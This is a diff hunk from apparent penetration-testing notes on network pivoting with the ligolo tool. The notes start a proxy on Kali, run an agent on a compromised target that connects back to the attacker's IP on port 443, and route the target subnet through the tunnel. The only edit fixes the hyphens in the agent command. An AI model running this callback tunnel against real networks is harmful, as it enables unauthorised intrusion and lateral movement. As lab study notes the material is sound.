@@ -63,7 +63,7 @@ sudo ip route add 192.168.98.0/24 dev ligolo  //route the target via new ligolo 
 ./proxy -selfcert –laddr 0.0.0.0:443   //starts the proxy on kali listening on 443 with selfcert// now the interface is up – check ip route list  
 on Target:  
 Copy the agent to the target and make it executable..  
-./agent -connect 10.10.200.X:443 –ignore-cert   //connect agent to proxy on kali IP 443 port --  
+./agent -connect 10.10.200.X:443 --ignore-cert   //connect agent to proxy on kali IP 443 port --  
 //One the agent joins the proxy server – shows agent joined //its double hyphens - -  
 on Kali:  
 session    //lists the available agent sessions //select the agent  
